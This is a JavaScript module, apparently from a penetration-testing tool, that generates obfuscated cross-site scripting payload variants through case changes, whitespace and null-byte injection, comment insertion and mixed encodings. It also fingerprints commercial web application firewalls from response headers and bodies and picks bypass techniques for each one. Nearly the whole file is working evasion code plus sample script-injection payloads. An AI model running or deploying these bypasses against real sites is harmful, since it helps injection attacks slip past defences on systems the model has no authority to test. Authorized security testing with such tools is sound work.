/**
 * Security WAF Bypass Composer
 * Generates obfuscated payloads for WAF evasion testing
 */

const payloadEncoder = require('./security-payload-encoder');

/**
 * Case variation patterns for common keywords
 */
const CASE_VARIATIONS = {
  script: ['script', 'ScRiPt', 'SCRIPT', 'sCrIpT'],
  img: ['img', 'Img', 'IMG', 'ImG'],
  svg: ['svg', 'Svg', 'SVG', 'SvG'],
  alert: ['alert', 'Alert', 'ALERT', 'AlErT'],
  onerror: ['onerror', 'OnError', 'ONERROR', 'OnErRoR'],
  onload: ['onload', 'OnLoad', 'ONLOAD', 'OnLoAd']
};

/**
 * Whitespace injection patterns
 */
const WHITESPACE_PATTERNS = {
  script: ['< script>', '<\tscript>', '<\nscript>', '<\rscript>'],
  tag_close: ['> ', '>\\t', '>\\n', ' >'],
  equals: [' =', '= ', '\\t=\\t', '\\n=\\n'],
  paren: ['( ', ' (', '\\t(\\t']
};

/**
 * Null byte injection patterns
 */
const NULL_BYTE_PATTERNS = {
  before_char: '%00',
  after_char: '%00',
  between_chars: '%00%00',
  end_of_string: '%00'
};

/**
 * Comment obfuscation patterns
 */
const COMMENT_PATTERNS = {
  html_comment: ['<!-- -->', '<!-->'],
  js_comment: ['//', '/* */'],
  mixed: ['<!--//-->', '/*--><--*/']
};

/**
 * Encoding mix patterns
 */
const ENCODING_MIXES = {
  url_html: {
    type: 'url+html',
    example: '%3Cscript%3Ealert(1)%3C/script%3E'
  },
  unicode_url: {
    type: 'unicode+url',
    example: '\\u003cscript\\u003e'
  },
  double_url: {
    type: 'double-url',
    example: '%253Cscript%253E'
  },
  base64_html: {
    type: 'base64+html',
    example: 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
  }
};

/**
 * Apply case variation to payload
 * @param {string} payload - Original payload
 * @returns {string[]} Array of case-varied payloads
 */
function applyCaseVariation(payload) {
  if (typeof payload !== 'string') return [];
  
  const variants = [payload];
  
  // Apply known keyword variations
  Object.entries(CASE_VARIATIONS).forEach(([keyword, variations]) => {
    const regex = new RegExp(keyword, 'gi');
    variations.forEach(variant => {
      variants.push(payload.replace(regex, variant));
    });
  });
  
  // Random case for remaining characters
  variants.push(payloadEncoder.caseRandomizePayload(payload));
  
  return [...new Set(variants)];
}

/**
 * Apply whitespace injection to payload
 * @param {string} payload - Original payload
 * @returns {string[]} Array of whitespace-injected payloads
 */
function applyWhitespaceInjection(payload) {
  if (typeof payload !== 'string') return [];
  
  const variants = [];
  
  // Use the encoder's whitespace function
  variants.push(payloadEncoder.whitespaceInjectPayload(payload));
  
  // Apply specific patterns
  variants.push(payload.replace(/</g, '< '));
  variants.push(payload.replace(/>/g, ' >'));
  variants.push(payload.replace(/=/g, ' = '));
  
  return [...new Set(variants)];
}

/**
 * Apply null byte injection to payload
 * @param {string} payload - Original payload
 * @returns {string[]} Array of null-byte-injected payloads
 */
function applyNullByteInjection(payload) {
  if (typeof payload !== 'string') return [];
  
  const variants = [
    payload + NULL_BYTE_PATTERNS.end_of_string,
    NULL_BYTE_PATTERNS.before_char + payload,
    payloadEncoder.nullByteInjectPayload(payload)
  ];
  
  return [...new Set(variants)];
}

/**
 * Apply comment obfuscation to payload
 * @param {string} payload - Original payload
 * @returns {string[]} Array of comment-obfuscated payloads
 */
function applyCommentObfuscation(payload) {
  if (typeof payload !== 'string') return [];
  
  const variants = [
    payloadEncoder.commentObfuscatePayload(payload)
  ];
  
  // Apply HTML comments
  COMMENT_PATTERNS.html_comment.forEach(comment => {
    variants.push(payload.replace(/</g, `<${comment}`));
    variants.push(payload.replace(/>/g, `${comment}>`));
  });
  
  return [...new Set(variants)];
}

/**
 * Apply encoding mix to payload
 * @param {string} payload - Original payload
 * @param {string} mixType - Encoding mix type
 * @returns {string} Encoded payload
 */
function applyEncodingMix(payload, mixType) {
  if (typeof payload !== 'string') return payload;
  
  switch (mixType) {
    case 'url+html':
      return payloadEncoder.htmlEntityEncodePayload(payloadEncoder.urlEncodePayload(payload));
    case 'unicode+url':
      return payloadEncoder.urlEncodePayload(payloadEncoder.unicodeEncodePayload(payload));
    case 'double-url':
      return payloadEncoder.doubleUrlEncodePayload(payload);
    case 'base64+html':
      return payloadEncoder.base64EncodePayload(payload);
    default:
      return payload;
  }
}

/**
 * Generate WAF bypass variants for a payload
 * @param {string} payload - Original payload
 * @param {Object} options - Bypass options
 * @param {boolean} options.caseVariation - Apply case variation
 * @param {boolean} options.whitespace - Apply whitespace injection
 * @param {boolean} options.nullByte - Apply null byte injection
 * @param {boolean} options.comment - Apply comment obfuscation
 * @param {boolean} options.encodingMix - Apply encoding mix
 * @param {number} maxVariants - Maximum variants to return
 * @returns {string[]} Array of WAF bypass variants
 */
function generateWafBypassVariants(payload, options = {}, maxVariants = 20) {
  if (typeof payload !== 'string') return [];
  
  const {
    caseVariation = true,
    whitespace = false,
    nullByte = false,
    comment = true,
    encodingMix = true
  } = options;
  
  let variants = [payload];
  
  if (caseVariation) {
    variants = [...variants, ...applyCaseVariation(payload)];
  }
  
  if (whitespace) {
    variants = [...variants, ...applyWhitespaceInjection(payload)];
  }
  
  if (nullByte) {
    variants = [...variants, ...applyNullByteInjection(payload)];
  }
  
  if (comment) {
    variants = [...variants, ...applyCommentObfuscation(payload)];
  }
  
  if (encodingMix) {
    variants = [...variants, ...Object.keys(ENCODING_MIXES).map(mix => 
      applyEncodingMix(payload, mix)
    )];
  }
  
  // Remove duplicates and limit
  return [...new Set(variants)].slice(0, maxVariants);
}

/**
 * Detect WAF from response and suggest bypass strategies
 * @param {number} statusCode - HTTP status code
 * @param {string} responseHeaders - Response headers
 * @param {string} responseBody - Response body
 * @returns {Object} WAF detection result
 */
function detectWafFromResponse(statusCode, responseHeaders, responseBody) {
  const headers = responseHeaders || {};
  const body = responseBody || '';
  
  // Common WAF signatures
  const wafSignatures = {
    cloudflare: {
      headers: ['cf-ray', 'cf-cache-status', 'server: cloudflare'],
      status: [403, 503],
      body: ['cloudflare', 'ray id:']
    },
    aws_waf: {
      headers: ['x-amzn-requestid', 'x-amzn-trace-id'],
      status: [403],
      body: ['access denied', 'aws']
    },
    akamai: {
      headers: ['x-akamai-transformed', 'akamai-grn'],
      status: [400, 403],
      body: ['akamai', 'access denied']
    },
    sucuri: {
      headers: ['x-sucuri-id', 'x-sucuri-cache'],
      status: [403],
      body: ['sucuri', 'cloudproxy']
    },
    imperva: {
      headers: ['x-iinfo'],
      status: [403],
      body: ['imperva', 'incapsula']
    },
    modsecurity: {
      headers: ['mod_security'],
      status: [403, 406],
      body: ['mod_security', 'not acceptable']
    }
  };
  
  const headerString = Object.entries(headers)
    .map(([k, v]) => `${k}: ${v}`)
    .join('\n')
    .toLowerCase();
  const bodyLower = body.toLowerCase();
  
  for (const [waf, signature] of Object.entries(wafSignatures)) {
    let score = 0;
    
    // Check headers
    signature.headers.forEach(sig => {
      if (headerString.includes(sig.toLowerCase())) score += 2;
    });
    
    // Check status
    if (signature.status.includes(statusCode)) score += 1;
    
    // Check body
    signature.body.forEach(sig => {
      if (bodyLower.includes(sig)) score += 3;
    });
    
    if (score >= 3) {
      return {
        detected: true,
        waf: waf,
        confidence: Math.min(score / 10, 1),
        recommended_bypass: getRecommendedBypassForWaf(waf)
      };
    }
  }
  
  // Generic WAF detection (403/406 on injection attempts)
  if ([403, 406, 429].includes(statusCode)) {
    return {
      detected: true,
      waf: 'generic',
      confidence: 0.5,
      recommended_bypass: getRecommendedBypassForWaf('generic')
    };
  }
  
  return { detected: false, waf: null, confidence: 0 };
}

/**
 * Get recommended bypass strategies for a specific WAF
 * @param {string} waf - WAF name
 * @returns {Object[]} Recommended bypass strategies
 */
function getRecommendedBypassForWaf(waf) {
  const strategies = {
    cloudflare: [
      { technique: 'case_variation', priority: 'high' },
      { technique: 'unicode_encoding', priority: 'high' },
      { technique: 'comment_obfuscation', priority: 'medium' }
    ],
    aws_waf: [
      { technique: 'double_url_encoding', priority: 'high' },
      { technique: 'whitespace_injection', priority: 'medium' }
    ],
    akamai: [
      { technique: 'html_entity_encoding', priority: 'high' },
      { technique: 'null_byte_injection', priority: 'medium' },
      { technique: 'case_variation', priority: 'medium' }
    ],
    generic: [
      { technique: 'case_variation', priority: 'high' },
      { technique: 'url_encoding', priority: 'high' },
      { technique: 'comment_obfuscation', priority: 'medium' }
    ]
  };
  
  return strategies[waf] || strategies.generic;
}

/**
 * Build adaptive WAF bypass test plan
 * @param {string} payload - Base payload
 * @param {Object} wafDetection - WAF detection result
 * @param {number} maxVariants - Maximum variants to generate
 * @returns {Object} WAF bypass test plan
 */
function buildWafBypassTestPlan(payload, wafDetection, maxVariants = 15) {
  const options = {
    caseVariation: true,
    whitespace: false,
    nullByte: false,
    comment: true,
    encodingMix: true
  };
  
  if (wafDetection.waf === 'cloudflare') {
    options.unicodeEncode = true;
  } else if (wafDetection.waf === 'aws_waf') {
    options.whitespace = true;
    options.encodingMix = 'double-url';
  } else if (wafDetection.waf === 'akamai') {
    options.nullByte = true;
  }
  
  const variants = generateWafBypassVariants(payload, options, maxVariants);
  
  return {
    waf_detected: wafDetection.waf,
    confidence: wafDetection.confidence,
    variants,
    test_order: variants.map((v, i) => ({
      order: i + 1,
      variant: v,
      technique: identifyBypassTechnique(v, payload)
    }))
  };
}

/**
 * Identify which bypass technique was used
 * @param {string} variant - Bypassed payload
 * @param {string} original - Original payload
 * @returns {string} Technique name
 */
function identifyBypassTechnique(variant, original) {
  if (variant !== original && variant.toLowerCase() === original.toLowerCase()) {
    return 'case_variation';
  }
  if (variant.includes('%00')) {
    return 'null_byte';
  }
  if (variant.includes('<!--') || variant.includes('-->')) {
    return 'comment_obfuscation';
  }
  if (variant.includes('%25') || variant.includes('%3C')) {
    return 'url_encoding';
  }
  if (variant.includes('\\u')) {
    return 'unicode_encoding';
  }
  if (variant !== original && variant.length > original.length) {
    return 'whitespace_injection';
  }
  return 'unknown';
}

module.exports = {
  applyCaseVariation,
  applyWhitespaceInjection,
  applyNullByteInjection,
  applyCommentObfuscation,
  applyEncodingMix,
  generateWafBypassVariants,
  detectWafFromResponse,
  getRecommendedBypassForWaf,
  buildWafBypassTestPlan,
  identifyBypassTechnique
};
